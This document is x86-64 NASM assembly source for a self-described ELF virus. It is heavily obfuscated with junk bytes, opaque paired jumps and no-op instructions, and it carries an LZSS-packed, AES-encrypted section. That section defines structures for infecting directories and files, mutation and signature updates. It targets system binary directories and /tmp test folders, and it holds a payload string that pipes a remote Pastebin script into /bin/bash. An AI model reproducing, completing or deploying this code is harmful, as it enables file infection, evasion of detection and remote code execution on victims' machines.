..@nApBMysnBayZ:
    push        rax
    jmp         ..@ItovAoD1lxsl
..@pYcN6SWBloO9:
    xchg        rsi, rsi
    jb          ..@ITtrjVPW31t7
    jae         ..@ITtrjVPW31t7
..@IKsOjWbrTqso:
%ifdef X86_64
    mov         eax, SYS_MMAP
%endif
    jmp         $+5
db 0x6a, 0x51, 0x7c
    jmp         $+4
db 0xd3, 0xa5
    jmp         ..@D79Hb1is89JV
..@0NlyB58bsT1V:
    jle         ..@iF1sqBTnDTEs
    jmp         $+5
db 0x28, 0x0f, 0x27
    jl          ..@hkIUefWURHAs
    jge         ..@hkIUefWURHAs
..@nyivp7zIQpaz:
    shl         eax, 1
    js          ..@ZpBEQisBeY7U
    jns         ..@ZpBEQisBeY7U
..@yHXOGKRmnGGF:
    xor         rax, rax
    jmp         $+4
db 0xf4, 0x62
    je          ..@zRT6gmxVQjKV
    jne         ..@zRT6gmxVQjKV
..@EdEH0s43SqyP:
    pop         rax
    jmp         $+5
db 0x96, 0x24, 0x81
    jmp         $+3
db 0x70
    jb          ..@7Z3LcM8pfym3
    jae         ..@7Z3LcM8pfym3
..@DY2UOkwwmu3Q:
    push        rdx
    jb          ..@bks8edVtNTsR
    jae         ..@bks8edVtNTsR
..@Zf3NByz7oMEe:
    pop         rdi
    jmp         ..@rpxykiz0sLWf
..@CM9btjlGTYYa:
    push        rcx
    jmp         $+4
db 0x76, 0x5e
    js          ..@VXxa9NG9oa52
    jns         ..@VXxa9NG9oa52
..@HOFSpRIbrPXT:
    add         bx, cx
    jmp         $+5
db 0xe1, 0x27, 0x08
    jmp         $+3
db 0xbb
    je          ..@PgCkHoVnfjX4
    jne         ..@PgCkHoVnfjX4
..@rpxykiz0sLWf:
    xchg        rdx, rdx
    jmp         ..@j0WfY827n4Tx
..@3BBeHY9QOoNg:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 0x0
    jmp         $+4
db 0x91, 0x9d
    jmp         ..@wOiqlJ5Vc3Iq
..@izkc2KflFvVM:
    xor         rdi, rdi
    jl          ..@riNFgq5fbj3T
    jge         ..@riNFgq5fbj3T
..@VDLcQRjxAdhp:
    push        rbx
    jmp         $+5
db 0x13, 0x68, 0xeb
    js          ..@ypJ4H2rboGVK
    jns         ..@ypJ4H2rboGVK
..@yldQuGZXHCCI:
    call        ..@ahfSQ2ExP0p5
    jmp         $+5
db 0xf8, 0x6a, 0x54
    jmp         ..@izkc2KflFvVM
..@Qqw6MaYxVPRV:
    pop         rax
    je          ..@kOG2f7mASjg5
    jne         ..@kOG2f7mASjg5
..@QoNQfEknpwP2:
    mov         rdi, rdi
    jmp         $+3
db 0xb6
    jmp         ..@rmkgSpLTk4Sr
..@q4tPEdUD0qtK:
    xchg        rdx, rdx
    jmp         ..@AbEbFvPiqg4f
..@Z9wrMsCWux2W:
    push        rsi
    jmp         $+4
db 0xd2, 0x6a
    jb          ..@FgI9xhrxZCm7
    jae         ..@FgI9xhrxZCm7
..@0HZNoPYKJ2AZ:
    mov         rbp, rbp
    jb          ..@qFPrit98phCg
    jae         ..@qFPrit98phCg
..@c35mZVQxSnvO:
%ifdef X86_32
    push        ebp
%endif
    jmp         $+4
db 0x8d, 0x94
    jmp         $+5
db 0x0d, 0x78, 0xef
    jb          ..@y1tW88JKHzja
    jae         ..@y1tW88JKHzja
..@eRNRgslNiX9u:
    inc         DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0x02
    jmp         ..@ziYeenjymhTL
..@y1tW88JKHzja:
%ifdef X86_32
    xor         ebp, ebp
%endif
    jmp         $+3
db 0x51
    jmp         $+3
db 0xaa
    jmp         $+5
db 0xe7, 0x25, 0xeb
    jl          ..@hNDqHr3uv6gS
    jge         ..@hNDqHr3uv6gS
..@8HpEosCfuMAj:
    mov         rsi, rsi
    jb          ..@H9c4dP4exm2T
    jae         ..@H9c4dP4exm2T
..@2akOYhADT5Uo:
    or          eax, 1
    jmp         $+5
db 0x0c, 0x17, 0xc7
    jmp         $+3
db 0x69
    jmp         $+3
db 0xdb
    jb          ..@8HpEosCfuMAj
    jae         ..@8HpEosCfuMAj
..@vC68LZX5chUg:
%ifdef X86_64
    pop         rbx
%endif
    js          ..@gR0qgxTVvwVh
    jns         ..@gR0qgxTVvwVh
..@JgQ4cacqDq7C:
    xor         r3, r3
    jmp         $+3
db 0x5d
    jmp         ..@hAF70CW5jXPL
..@ygIbNkF2BFqp:
%ifdef X86_64
    mov         edx, 111b
%endif
    js          ..@BJI4Dnl66PeD
    jns         ..@BJI4Dnl66PeD
..@dvqT2LxlKIqk:
    xchg        rdi, rdi
    jmp         $+5
db 0x78, 0x9f, 0xa5
    jmp         $+4
db 0x93, 0xd0
    jmp         $+4
db 0xec, 0xe4
    js          ..@VNzVc2p7OdO9
    jns         ..@VNzVc2p7OdO9
..@Bb7KYAsWSNsi:
    xor         rbx, rbx
    jb          ..@hJUSYigV99co
    jae         ..@hJUSYigV99co
..@n1HXikq6Wiwv:
    push        rdi
    jmp         $+4
db 0x32, 0x9b
    jl          ..@AbxzbNVRZO0E
    jge         ..@AbxzbNVRZO0E
..@H9c4dP4exm2T:
    mov         rbx, rbx
    jmp         $+3
db 0xf6
    jmp         $+5
db 0x7c, 0xf0, 0x58
    js          ..@PmpK8x1N4dPi
    jns         ..@PmpK8x1N4dPi
..@h4IgJVvJAy1X:
    xor         rdi, rdi
    jmp         ..@Yl1icAYYTJt7
..@NIA2ii879KvH:
    jmp         ..@hkIUefWURHAs
    js          ..@qL3Z0Zv2aXq9
    jns         ..@qL3Z0Zv2aXq9
..@QvTohRdg74hB:
    xchg        rcx, rcx
    jmp         ..@QeIB37JR3lGi
..@75pQOEChuLiC:
    pop         rdx
    je          ..@A8a3hfhffVsJ
    jne         ..@A8a3hfhffVsJ
..@rzmrzZQrKC9s:
    mov         r1, r5
    jmp         $+4
db 0x2c, 0x8b
    js          ..@nApBMysnBayZ
    jns         ..@nApBMysnBayZ
..@MwImcZGL1ECW:
    xchg        rcx, rcx
    jmp         $+3
db 0x45
    jmp         $+4
db 0xd5, 0x92
    jmp         ..@s7mkk4yqrkKt
..@uKga9kL4wPAF:
%ifdef X86_64
    mov         esi, original_virus_len-non_packed_len
%endif
    js          ..@ygIbNkF2BFqp
    jns         ..@ygIbNkF2BFqp
..@7Z3LcM8pfym3:
    xor         r2, r2
    jmp         $+5
db 0x84, 0x07, 0x9c
    jl          ..@JgQ4cacqDq7C
    jge         ..@JgQ4cacqDq7C
..@QzOyxB8Va6Fn:
%ifdef X86_32
    mov         esi, 0x22
%endif
    jmp         $+5
db 0x3a, 0x4b, 0xb9
    jmp         ..@CAiQJheeBwgD
..@zOOiMKktTejn:
    add         ecx, 1
    jmp         $+4
db 0x8e, 0xf7
    js          ..@q4tPEdUD0qtK
    jns         ..@q4tPEdUD0qtK
..@s7mkk4yqrkKt:
    mov         rdx, rdx
    jmp         ..@Ijn1lt97qPrS
..@7bdfqlVbodWq:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         $+4
db 0x01, 0x4c
    jmp         ..@nwNhLbBuKFvL
..@RNJABhKB2DjU:
    jz          ..@8gq3NUQCR0E2
    jmp         $+4
db 0x8b, 0x87
    jl          ..@tRlTV0HnS8c9
    jge         ..@tRlTV0HnS8c9
..@Fj3576ALD9UP:
    push        rsi
    je          ..@m3CR4zwLAFxe
    jne         ..@m3CR4zwLAFxe
..@PSEp8WQmjhYL:
    rep         stosb
    jmp         $+5
db 0x74, 0xfb, 0xae
    jmp         ..@40eobcUC76wm
..@uBdCQJqAQfJW:
    mov         rcx, POSITION_BITS
    jmp         ..@jSytXfxIsdIE
..@FAOYpNUryacN:
    push        rdi
    jmp         ..@Zf3NByz7oMEe
..@Erub2TGoat06:
    xchg        rcx, rcx
    jb          ..@wkIMhXPkZdGG
    jae         ..@wkIMhXPkZdGG
..@OmrsPSe1r2SV:
    xchg        rcx, rcx
    jmp         $+4
db 0x88, 0x83
    js          ..@sBtbh0TgizKK
    jns         ..@sBtbh0TgizKK
..@UZtK2spha6BF:
    call        ..@ahfSQ2ExP0p5
    jl          ..@jhjBwr10KKnr
    jge         ..@jhjBwr10KKnr
..@EwlBaeRgKHif:
    xchg        rbx, rbx
    jmp         $+4
db 0x6f, 0xb8
    jmp         ..@j6rB63BRA5j5
..@qFPrit98phCg:
    push        rsi
    jmp         $+3
db 0x5a
    js          ..@zwKq3583KfP9
    jns         ..@zwKq3583KfP9
..@8gq3NUQCR0E2:
    xchg        rdx, rdx
    jb          ..@EwlBaeRgKHif
    jae         ..@EwlBaeRgKHif
..@zRT6gmxVQjKV:
    xor         rdx, rdx
    jb          ..@Bb7KYAsWSNsi
    jae         ..@Bb7KYAsWSNsi
..@PmpK8x1N4dPi:
    shr         BYTE [rsp+_LZSSD_OFF.mask], 1
    jmp         $+4
db 0xd1, 0x4f
    js          ..@0TKxGMRhW3cl
    jns         ..@0TKxGMRhW3cl
..@5mnU4YRwj28A:
    mov         rsi, rax 
    jmp         $+5
db 0x3e, 0x18, 0x0e
    js          ..@MwImcZGL1ECW
    jns         ..@MwImcZGL1ECW
..@Hgr5eY2wU72z:
    ret
    jmp         $+4
db 0xaa, 0x62
    jmp         ..@EANq1CxCAlxO
..@H9TQNJEWbWao:
%ifdef X86_64
    mov         r8, 0xffffffffffffffff
%endif
    jmp         ..@IKsOjWbrTqso
..@uUkQXK9jeIJV:
    jnz         ..@hJUSYigV99co
    jmp         ..@z2kTbI36oygx
..@tEa3FFoXtdcY:
    push        rsi
    jmp         $+4
db 0xd8, 0xa3
    jl          ..@AfpIPnfIzDJF
    jge         ..@AfpIPnfIzDJF
..@hAF70CW5jXPL:
%ifdef X86_32
    mov         ecx, original_virus_len-non_packed_len
%endif
    jmp         $+3
db 0x42
    jl          ..@aP0lF6vuG91E
    jge         ..@aP0lF6vuG91E
..@2uLoXpcJjyy2:
    mov         rbx, rbx
    je          ..@Z9wrMsCWux2W
    jne         ..@Z9wrMsCWux2W
..@Itf7dxyvgluQ:
    add         rax, 1
    jb          ..@c2VSRNuQVfNn
    jae         ..@c2VSRNuQVfNn
..@rzb2aNvwxqoF:
    push        rdx
    jmp         $+4
db 0xeb, 0xb8
    jmp         ..@hZfAG4BIzetF
..@pnkoJIMWoM1A:
    call        LzssDecoder
    jmp         ..@4v4rn7HOs7VU
..@iO4CVzu6QfKc:
    mov         rcx, rcx
    jb          ..@gEHlcPSJlbzg
    jae         ..@gEHlcPSJlbzg
..@KoRvVTNU4Mhr:
    inc         QWORD [rsp+_LZSSD_OFF.outputaddr]
    jmp         $+5
db 0xdc, 0xe7, 0xdd
    jmp         $+4
db 0x74, 0x75
    jmp         ..@VDLcQRjxAdhp
..@5iJg8ogFnPr8:
    xchg        rdx, rdx
    jmp         $+5
db 0x10, 0x72, 0x12
    jb          ..@QvTohRdg74hB
    jae         ..@QvTohRdg74hB
..@ziYeenjymhTL:
    and         DWORD [rsp+_LZSSD_OFF.index], WINDOW_LENGTH-1
    jmp         ..@OmrsPSe1r2SV
..@bp0e2uTKn7PO:
    xchg        rsi, rsi
    jb          ..@2NHh6A7jCc9b
    jae         ..@2NHh6A7jCc9b
..@4ZGWw8EbSg2y:
    mov         rdx, rdx
    jmp         $+3
db 0x40
    jmp         ..@OiTWr5Kkcb1q
..@VHxeqtC8ny1v:
    push        rdx
    jmp         $+3
db 0x8f
    jmp         $+5
db 0x52, 0xad, 0x92
    js          ..@kFwWCmFh1pWU
    jns         ..@kFwWCmFh1pWU
..@BGOe4FQIMXXv:
    xchg        rbx, rbx
    jl          ..@YFohO5AoaAob
    jge         ..@YFohO5AoaAob
..@XGapTkhEsXPC:
    GGLOBAL     virus_len
    jmp         $+4
db 0x77, 0x81
    jmp         $+5
db 0x85, 0x6c, 0xb8
    jmp         $+5
db 0x3b, 0x02, 0xdc
    jmp         ..@VHxeqtC8ny1v
..@CAiQJheeBwgD:
%ifdef X86_32
    mov         edi, 0xffffffff
%endif
    jmp         $+3
db 0x38
    jl          ..@c35mZVQxSnvO
    jge         ..@c35mZVQxSnvO
..@58fhXWjPV9xk:
    push        rcx
    js          ..@bQnGC1ue7Q8j
    jns         ..@bQnGC1ue7Q8j
..@qvLzFGE6ZFdZ:
    mov         rbp, rbp
    jb          ..@pYcN6SWBloO9
    jae         ..@pYcN6SWBloO9
..@skoKaa2zQCAj:
    push        rbx
    jmp         $+5
db 0xd9, 0xad, 0xbe
    jmp         $+3
db 0x97
    jmp         $+4
db 0xef, 0x7d
    jmp         $+5
db 0xde, 0xae, 0x63
    js          ..@SDiBOhxHdIzK
    jns         ..@SDiBOhxHdIzK
..@nEi2MSWbOHmx:
    xchg        rax, rax
    jl          ..@uBdCQJqAQfJW
    jge         ..@uBdCQJqAQfJW
..@XlumeN8W6Ujm:
    mov         BYTE [rbx], al
    jmp         $+3
db 0x56
    jmp         ..@KoRvVTNU4Mhr
..@OdlfaUDFpO57:
%ifdef X86_32
    pop         rcx
%endif
    jmp         $+4
db 0xc0, 0x88
    jmp         ..@G7z9Ddbnh0pX
..@VXxa9NG9oa52:
    pop         rcx
    js          ..@uUkQXK9jeIJV
    jns         ..@uUkQXK9jeIJV
..@9qfxK801tPdH:
    mov         rsp, rsp
    jmp         $+4
db 0x4a, 0xc5
    je          ..@mI0mGvoJ8KP3
    jne         ..@mI0mGvoJ8KP3
..@ITtrjVPW31t7:
    test        rax, rax
    jmp         $+5
db 0xf2, 0x97, 0xd5
    js          ..@RNJABhKB2DjU
    jns         ..@RNJABhKB2DjU
..@xduG8hMZdbjY:
    xor         r2, r2
    jb          ..@rqEKrNzdkMPw
    jae         ..@rqEKrNzdkMPw
..@EQ1mUC1DriMo:
    mov         rsp, rsp
    js          ..@ZNmrhXgky0vl
    jns         ..@ZNmrhXgky0vl
..@gEHlcPSJlbzg:
    mov         rax, rax
    jmp         $+4
db 0xd3, 0x36
    jl          ..@cXekhJNOfQa8
    jge         ..@cXekhJNOfQa8
..@ictYIa5TpU6t:
    GGLOBAL     _packed
    js          ..@nQ2NaqxGSqmk
    jns         ..@nQ2NaqxGSqmk
..@rqEKrNzdkMPw:
    mov         r2d, DWORD [r5]
    jmp         $+4
db 0x82, 0xcc
    js          ..@EedHYg0UJskS
    jns         ..@EedHYg0UJskS
..@QwZ3tImes6kI:
    mov         rsi, rsi
    js          ..@0HZNoPYKJ2AZ
    jns         ..@0HZNoPYKJ2AZ
..@naM6RuZHNXqC:
    mov         dl, BYTE [rbx]
    jb          ..@WwUqFq6q1VWI
    jae         ..@WwUqFq6q1VWI
..@VOoJknRpgWgU:
    mov         m8, rax
    jmp         $+3
db 0x7d
    je          ..@dvqT2LxlKIqk
    jne         ..@dvqT2LxlKIqk
..@2NHh6A7jCc9b:
    xor         rax, rax
    js          ..@x2zQfNEGAEuC
    jns         ..@x2zQfNEGAEuC
..@tyLkga0S02pY:
    pop         rcx
    jmp         $+5
db 0xb4, 0xf6, 0xd0
    jmp         $+3
db 0x07
    jmp         $+3
db 0xbb
    jmp         ..@skoKaa2zQCAj
..@iF1sqBTnDTEs:
    mov         rbx, rsi
    jmp         $+3
db 0xa6
    js          ..@WtEmPO45c6xS
    jns         ..@WtEmPO45c6xS
..@bks8edVtNTsR:
    pop         rdx
    jb          ..@pnkoJIMWoM1A
    jae         ..@pnkoJIMWoM1A
..@lQ15jcPv0OiU:
    jmp         ..@tEa3FFoXtdcY
    jb          ..@ahfSQ2ExP0p5
    jae         ..@ahfSQ2ExP0p5
..@y8lzKxTC5Fwp:
    call        ..@ahfSQ2ExP0p5
    jmp         $+5
db 0xff, 0x97, 0x5c
    jmp         $+3
db 0x46
    jmp         ..@Itf7dxyvgluQ
..@uzSZHUT4foGd:
    lea         rdi, QWORD [rsp+_LZSSD_OFF.buffer] 
    jmp         $+3
db 0xbe
    jmp         ..@U6YUcGFT2Wtt
..@X4z9djhSXtmN:
    mov         r3, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@Hk016NvI1WYY
..@EANq1CxCAlxO:
    xchg        rdx, rdx
    jmp         $+3
db 0xcf
    jmp         ..@tEa3FFoXtdcY
..@SDiBOhxHdIzK:
    pop         rbx
    jmp         $+4
db 0x92, 0xa7
    jmp         ..@rzmrzZQrKC9s
..@x2zQfNEGAEuC:
    xor         rcx, rcx
    jmp         $+5
db 0x5b, 0x22, 0xd3
    jb          ..@8MVuRuGTGYAK
    jae         ..@8MVuRuGTGYAK
..@U6YUcGFT2Wtt:
    mov         rax, 0x20
    jmp         $+5
db 0x44, 0x40, 0x9f
    jmp         $+4
db 0x09, 0xfa
    jmp         ..@58fhXWjPV9xk
..@gOAgu1XyACff:
    push        rdi
    jmp         $+4
db 0x2a, 0x2c
    jmp         $+3
db 0xe9
    jmp         $+5
db 0x46, 0xfd, 0x0d
    jb          ..@iO4CVzu6QfKc
    jae         ..@iO4CVzu6QfKc
..@ByqnE7JEA1fl:
    push        rdi
    jmp         ..@Hgr5eY2wU72z
..@B4kWeKgltHRk:
    pop         rdx
    jb          ..@2uLoXpcJjyy2
    jae         ..@2uLoXpcJjyy2
..@LVJ42gPtBXQe:
%ifdef X86_32
    xchg        rsp, rsp
%endif
    jmp         $+4
db 0x4b, 0x81
    jl          ..@QzOyxB8Va6Fn
    jge         ..@QzOyxB8Va6Fn
..@qL3Z0Zv2aXq9:
    push        rbx
    jl          ..@7KJCQEznW7nE
    jge         ..@7KJCQEznW7nE
..@0S4ooGSg5Nep:
    xor         rax, rax
    jmp         ..@5bnvxHagG5Lm
..@PRWAoW1TYHAq:
    mov         edi, DWORD [rsp+_LZSSD_OFF.index]
    jmp         $+3
db 0xcb
    jmp         $+3
db 0x1a
    jmp         $+5
db 0xb2, 0x66, 0xd2
    jb          ..@k39v1AQXtRFW
    jae         ..@k39v1AQXtRFW
..@GJ40GInEebXg:
    mov         BYTE [rsp+_LZSSD_OFF.mask], 10000000b
    jmp         ..@nyivp7zIQpaz
..@m3CR4zwLAFxe:
    pop         rsi
    jmp         $+3
db 0x78
    jmp         $+5
db 0x33, 0xa5, 0x16
    jmp         ..@r0V2lyp1hq4n
..@nONoCtGh3u5k:
    pop         rax
    jmp         ..@xduG8hMZdbjY
..@zbzEn9WW8E69:
    mov         rbx, [rsp+_LZSSD_OFF.outputaddr] 
    jmp         $+3
db 0x7b
    js          ..@XlumeN8W6Ujm
    jns         ..@XlumeN8W6Ujm
..@sBtbh0TgizKK:
    xchg        rax, rax
    je          ..@n1HXikq6Wiwv
    jne         ..@n1HXikq6Wiwv
..@AfpIPnfIzDJF:
    pop         rsi
    jmp         $+5
db 0x45, 0x01, 0x67
    jmp         ..@R5kKiKssvKWd
..@31FWjtZTMjbS:
    mov         r1, QWORD [rsp+_UEC_OFF.mapaddr]
    jmp         ..@Erub2TGoat06
..@9wWrDYnkNywm:
    mov         rdx, rdx
    jmp         ..@goxJN2n16X30
..@BJI4Dnl66PeD:
%ifdef X86_64
    mov         rax, rax
%endif
    js          ..@7xF3MPGL5WuR
    jns         ..@7xF3MPGL5WuR
..@XCgNh3aAIXm8:
    push        rax
    jmp         $+4
db 0x76, 0x67
    jl          ..@RyECxG7fV1Bh
    jge         ..@RyECxG7fV1Bh
..@riNFgq5fbj3T:
    mov         rbx, rbx
    jl          ..@zbzEn9WW8E69
    jge         ..@zbzEn9WW8E69
..@EedHYg0UJskS:
    sub         r2, non_packed_len
    js          ..@X4z9djhSXtmN
    jns         ..@X4z9djhSXtmN
..@R5kKiKssvKWd:
    add         rsp, _LZSSD_OFF_size
    jmp         ..@m7YR5G6EuuUJ
..@OrCDJG50kC1m:
    push        rcx
    jmp         $+4
db 0x4a, 0x7b
    jb          ..@tyLkga0S02pY
    jae         ..@tyLkga0S02pY
..@goxJN2n16X30:
    test        dl, dl
    js          ..@q4BXovzvpWm0
    jns         ..@q4BXovzvpWm0
..@bQnGC1ue7Q8j:
    pop         rcx
    jmp         $+4
db 0x40, 0x77
    jmp         $+4
db 0x70, 0x80
    jl          ..@gOAgu1XyACff
    jge         ..@gOAgu1XyACff
..@fZ0FS0JNjbhQ:
    mov         rax, SYS_MUNMAP
    jmp         $+3
db 0x50
    jl          ..@97AgiPwCEf3j
    jge         ..@97AgiPwCEf3j
..@ItovAoD1lxsl:
    pop         rax
    jmp         $+5
db 0xf2, 0xbc, 0x05
    jmp         ..@XGapTkhEsXPC
..@7KJCQEznW7nE:
    pop         rbx
    jmp         $+3
db 0x60
    js          ..@qvLzFGE6ZFdZ
    jns         ..@qvLzFGE6ZFdZ
..@Yl1icAYYTJt7:
    xchg        rdx, rdx
    jmp         ..@PRWAoW1TYHAq
..@jSytXfxIsdIE:
    call        ..@ahfSQ2ExP0p5
    jmp         $+4
db 0x51, 0xcd
    jb          ..@5mnU4YRwj28A
    jae         ..@5mnU4YRwj28A
..@4v4rn7HOs7VU:
    mov         rax, QWORD [rsp+_UEC_OFF.mapaddr]
    jl          ..@VOoJknRpgWgU
    jge         ..@VOoJknRpgWgU
..@wkIMhXPkZdGG:
    mov         rsp, rsp
    jmp         $+3
db 0x71
    jmp         ..@WpjrXKHlBCLE
..@XW0xA2vXiO3X:
    mov         rbp, rbp
    jmp         $+4
db 0xdc, 0x66
    jmp         ..@SLF4wHtA56Zm
..@wOiqlJ5Vc3Iq:
    mov         QWORD [rsp+_LZSSD_OFF.length], r2
    jl          ..@z695OW8QfH4w
    jge         ..@z695OW8QfH4w
..@5QKDpnUIKLaK:
    cmp         QWORD [rsp+_LZSSD_OFF.length], 0x00
    jmp         $+3
db 0x8d
    jb          ..@EQ1mUC1DriMo
    jae         ..@EQ1mUC1DriMo
..@b4P2rJQnKHJS:
%ifdef X86_32
    push        rcx
%endif
    jmp         ..@OdlfaUDFpO57
..@ahfSQ2ExP0p5:
    pop         rdi
    jmp         $+4
db 0x80, 0x8b
    jmp         $+3
db 0xab
    je          ..@rgmp5UJdBy5Z
    jne         ..@rgmp5UJdBy5Z
..@RyECxG7fV1Bh:
    xchg        rax, rax
    jmp         $+4
db 0xf2, 0x58
    jb          ..@nONoCtGh3u5k
    jae         ..@nONoCtGh3u5k
..@kVA86XHUNBah:
    xor         rax, rax
    jmp         $+5
db 0xb2, 0xe2, 0xd4
    jl          ..@31FWjtZTMjbS
    jge         ..@31FWjtZTMjbS
..@0xl16wxwyoKC:
    pop         rax
    jmp         $+4
db 0x9b, 0xdf
    jmp         $+4
db 0xf8, 0xba
    jmp         ..@QoNQfEknpwP2
..@WtEmPO45c6xS:
    mov         rsi, rsi
    jmp         ..@HOFSpRIbrPXT
..@5bnvxHagG5Lm:
    xor         r1, r1
    jb          ..@DLszNLuNlyBa
    jae         ..@DLszNLuNlyBa

;-----------------------------------------------------
; PACKED & ENCRYPTED PART (This part of the code is 
; packed with LZSS then encrpyted and is executed in 
; a mapped zone).
_packed:
    jmp         Processes
;-----------------------------------------------------
; Packed & Encrypted structures.
struc _PROC_OFF
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x100
    .filefd     resd 0x1
endstruc
struc _NBF_OFF
    .index      resw 0x1
    .file       resq 0x1
    .key        resb 0x20
endstruc
struc _PAYLOAD_OFF
    .key        resb 0x20
    .index      resw 0x1
    .entry      resq 0x1
endstruc
struc _MUTA_OFF
    .start      resq 0x1
    .index      resd 0x1
    .size       resd 0x1
    .key        resq 0x1
    .random_BYTE resb 0x1
endstruc
struc _AESE_OFF
    .key_exp    resb 0x100
    .startaddr  resq 0x1
    .length     resq 0x1
    .keyaddr    resq 0x1
endstruc
struc _LZSSE_OFF
    .buffer     resb WINDOW_LENGTH*2
    .inputaddr  resq 0x1
    .outputaddr resq 0x1
    .saveoutptr resq 0x1
    .length     resq 0x1
    .buffersize resw 0x1
    .la_index   resw 0x1
    .w_index    resw 0x1
    .cmp_len    resb 0x1
    .match_pos  resw 0x1
    .match_len  resb 0x1
    .character  resb 0x1
    .bits       resb 0x1
    .mask       resb 0x1
endstruc
struc _UPDATASIG_OFF
    .signaddr   resq 0x1
    .index      resw 0x1
    .keyprev    resd 0x1
    .meta_ptr   resq 0x1
endstruc
struc _KEYGEN_OFF
    .bufferaddr resq 0x1
    .fd         resd 0x1
endstruc
struc _INFDIR_OFF
    .depth      resb 0x1
    .dirname    resq 0x1
    .dirfd      resd 0x1
    .dirbuf     resb DIRENT_BUFSIZE
    .dirnread   resq 0x1
    .dirindex   resq 0x1
    .buffer     resb 0x101*(SUBDIR_MAXDEPTH+1)
endstruc
struc _INFFILE_OFF
    .file       resb file_size
    .entry      resq 0x1
endstruc
struc _VADDR_OFF
    ._vaddr     resq 0x1
    .tmp_vaddr  resq 0x1
    .tmp_offset resq 0x1
endstruc
struc _DYNPIE_OFF
    .ptr        resq 0x1
    .sh_ptr     resq 0x1
    .shentsize  resw 0x1
    .shnum      resw 0x1
endstruc
;-----------------------------------------------------
; Packed & Encrypted variables.
VARIABLES packed
procdir:    db "/proc/", 0
status:     db "/status", 0

procs: 
proc2:      db "cat", 0
proc1:      db "vim", 0
db 0x00

devnull:    db "/dev/null", 0
execve1:    db "/bin/bash", 0
execve2:    db "-c", 0
execve3:    db "curl -s https://pastebin.com/raw/vr3vaWbx | /bin/bash", 0
urandom:    db "/dev/urandom", 0
pwd_var:    db "PWD", 0

dirs_root:
bindir1:    db "/usr/local/sbin", 0
bindir2:    db "/usr/local/bin", 0
bindir3:    db "/usr/sbin", 0
bindir4:    db "/usr/bin", 0
bindir5:    db "/sbin", 0
bindir6:    db "/bin", 0
dirs_tmp:
test2:      db "/tmp/test2", 0
test:       db "/tmp/test", 0
db 0x00
;-----------------------------------------------------
; Packed & Encrypted code.
;-----------------------------------------------------
Processes:
    jmp         ..@XllbZTvVSXz4
..@K9cCOMQjhXV4:
    push        rdi
    jl          ..@76oJAzVWjFzm
    jge         ..@76oJAzVWjFzm
..@TkjmvYujN7H9:
    mov         rax, rax
    jl          ..@LFCZiU4Bhccc
    jge         ..@LFCZiU4Bhccc
..@pllo4JFSo1Ho:
    push        rdi
    jmp         $+3
db 0xc5
    jmp         ..@ZUJQZEeebrQt
..@RRLbYBbHnkVv:
    ret
    jl          ..@AToVnatlbBVz
    jge         ..@AToVnatlbBVz
..@RodA4L9SJLXz:
    jle         ..@oLeDQ8kpkmQ7
    jmp         $+4
db 0x3f, 0x7d
    jmp         $+5
db 0xe3, 0x02, 0x67
    jb          ..@aNhbvN7mwZaD
    jae         ..@aNhbvN7mwZaD
..@sqigGh1xI9RE:
%ifdef X86_64
    mov         r10, 0x22
%endif
    jl          ..@Z0FqRIEs4RAB
    jge         ..@Z0FqRIEs4RAB
..@rs60I3fgbWkB:
    jmp         ..@GuWIh8qm4zMg
    jb          ..@I2IN09QItmHU
    jae         ..@I2IN09QItmHU
..@2y0YUILZkIKc:
    push        rdi
    je          ..@jpvn2RDbnEwa
    jne         ..@jpvn2RDbnEwa
..@rB8JI6bT3x9a:
    push        rdx
    jmp         $+3
db 0x42
    jmp         $+4
db 0xda, 0xbe
    jb          ..@47bV9HnyQvIi
    jae         ..@47bV9HnyQvIi
..@mkklvPMWTZP1:
    pop         rsi
    jmp         $+3
db 0xc9
    jl          ..@x9DmboUmU6HC
    jge         ..@x9DmboUmU6HC
..@2G7Ta2Ck2AQK:
    mov         rcx, rcx
    jb          ..@PSwaKYpl0Yv1
    jae         ..@PSwaKYpl0Yv1
..@QGA4oQMp8Fco:
    pop         rsi
    jmp         $+4
db 0x13, 0x59
    jmp         ..@AEm1z4TxYvs3
..@4IIqS8bguY0N:
    pop         rsi
    jmp         $+3
db 0x2a
    jmp         ..@1pEE23xxdEti
..@uiwJvslkkDtE:
    mov         rdx, rdx
    js          ..@t33KepKXXGqR
    jns         ..@t33KepKXXGqR
..@nUR9kBy2ouYw:
    mov         rcx, rcx
    jmp         ..@AZzwjLrw3Jq5
..@oxlDjPi3J5vK:
    mov         rdi, rdi
    je          ..@UwQqBwbJXmp6
    jne         ..@UwQqBwbJXmp6
..@xfNKPN4jQ7KX:
    push        rcx
    jmp         $+4
db 0x71, 0x4c
    jmp         ..@JXnDV4qW1G7y
..@2yR7diAqbNwi:
    jbe         ..@h69jBOvcIRSR
    jmp         $+4
db 0xba, 0xf9
    jmp         ..@iljOnqcs11X3
..@kS3gHZ4pikOG:
%ifdef X86_64
    xor         rdi, rdi
%endif
    jb          ..@GWoZMhVlzO7j
    jae         ..@GWoZMhVlzO7j
..@KteTZUj0Bp8W:
    xor         r4, r4
    jmp         ..@2QwpMa40wgqU
..@hSr1Ow89MLTZ:
    pxor        xmm0, xmm1
    jb          ..@S1upbwh7XvKL
    jae         ..@S1upbwh7XvKL
..@gcfZrNJ0TbuV:
    test        al, al
    js          ..@LthSUach36Y1
    jns         ..@LthSUach36Y1
..@KSers9EhjbMq:
    lea         r2, [rsp+_INFDIR_OFF.dirbuf+linux_dirent.d_name+r4]
    jl          ..@2jPiKoTfsRTr
    jge         ..@2jPiKoTfsRTr
..@HykJWkXD1tlV:
    pop         rax
    jmp         $+4
db 0xe2, 0x6b
    js          ..@WksEF28HtRJn
    jns         ..@WksEF28HtRJn
..@x313xcUbSJCE:
    mov         ecx, 0x8
    js          ..@yv7nSl33KAvv
    jns         ..@yv7nSl33KAvv
..@KTGllJUv60tz:
    xchg        rax, rax
    jmp         $+5
db 0x6f, 0xae, 0x3f
    jmp         $+5
db 0x1e, 0xf9, 0x99
    jmp         $+3
db 0xfb
    je          ..@ersxvQGQ5PgJ
    jne         ..@ersxvQGQ5PgJ
..@zfNkm4UtJYWq:
    xor         rdx, rdx
    jmp         ..@68tutwOvTntf
..@fHeTOmWKIs8k:
    pop         rbx
    jmp         $+5
